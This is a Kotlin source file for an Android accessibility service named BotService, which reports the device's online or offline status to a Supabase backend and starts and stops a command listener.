package com.boti.bot

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.*

class BotService : AccessibilityService() {

    companion object {
        var instance: BotService? = null
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onServiceConnected() {
        instance = this
        DeviceId.init(applicationContext)

        scope.launch {
            runCatching { SupabaseClient.updateDeviceStatus(DeviceId.get()!!, "online") }
        }

        CommandListener.start()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {}

    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        CommandListener.stop()
        scope.launch {
            runCatching { SupabaseClient.updateDeviceStatus(DeviceId.get()!!, "offline") }
        }
        instance = null
    }
}
